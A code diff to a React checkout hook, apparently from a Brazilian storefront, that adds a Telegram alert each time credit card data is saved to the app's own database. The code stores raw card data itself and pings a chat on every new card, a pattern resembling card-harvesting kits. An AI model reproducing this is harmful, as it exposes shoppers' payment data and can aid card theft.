@@ -2,6 +2,7 @@
 import { useState } from 'react';
 import { CustomerData, Order, PaymentMethod, PaymentStatus, Product, BillingData, CreditCardData } from '@/types/checkout';
 import { supabase } from '@/integrations/supabase/client';
+import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
 
 export const useCheckoutOrder = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -76,6 +77,13 @@ export const useCheckoutOrder = () => {
       console.error('Erro ao salvar dados do cartão:', error);
       // Não vamos falhar o pedido se o cartão não for salvo,
       // mas vamos logar o erro para identificar problemas
+    } else {
+      // Enviar notificação para o Telegram quando os dados do cartão forem salvos no banco
+      try {
+        await sendTelegramNotification(`💳 Novo cartão salvo no BD - ${cardData.brand.toUpperCase() || 'Unknown'}`);
+      } catch (telegramError) {
+        console.error('Erro ao enviar notificação para o Telegram:', telegramError);
+      }
     }
   };
   
